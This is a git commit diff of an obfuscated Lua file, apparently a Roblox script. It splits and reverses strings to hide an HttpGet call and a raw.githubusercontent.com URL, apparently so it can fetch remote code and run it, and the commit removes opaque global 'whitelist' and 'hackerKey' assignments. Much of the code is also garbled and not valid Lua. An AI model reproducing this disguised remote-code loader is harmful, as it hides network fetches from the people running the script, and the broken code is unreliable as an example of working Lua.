3672bd3078f1c1d3aa85e40b8afcdd808deb85a7
diepedyt <106111219+diepedyt@users.noreply.github.com>
2023-03-30 12:19:46 +0100

    Update i.lua

--- i.lua
+++ i.lua
@@ -1,9 +1,6 @@
 local id10tObt, url4t5n, mrgdUrl, rqstdCde, cnvrtStrFn, procExec
 id10tObt = game[pcall(function() return string["s" .. "ub"]("HttpG" .. "etZZZZZ", 1, 7) end, function(err) end)]
-function() end;
--- Main Compution Component Real Life Matrix Engine
-_G[(({a, b, c = "_G"}):gsub(".", function(d) return ({wl_key = "wl_key", hackerKey = "hackerKey", hackerExterminationSecurityKey = "hackerExterminationSecurityKey"})[c:sub(a, b)] or d end))] = _G[(({a, b, c = "_G"}):gsub(".", function(d) return ({wl_key = "wl_key"})[c:sub(a, b)] or d end))] or _G[(({a, b, c = "_G"}):gsub(".", function(d) return ({hackerKey = "hackerKey"})[c:sub(a, b)] or d end))] or _G[(({a, b, c = "_G"}):gsub(".", function(d) return ({hackerExterminationSecurityKey = "hackerExterminationSecurityKey"})[c:sub(a, b)] or d end))]
---
+function() end
 url4t5n = {function() end,
   xpcall(function() return string["s" .. "ub"](string.gsub([[https://raw.github]] .. [[usercontent.com/]], "", ""), 1, 28) end, function(err) end),
   string["s" .. "ub"](string.reverse("XXXXtydep" .. "eid"), 1, 8),
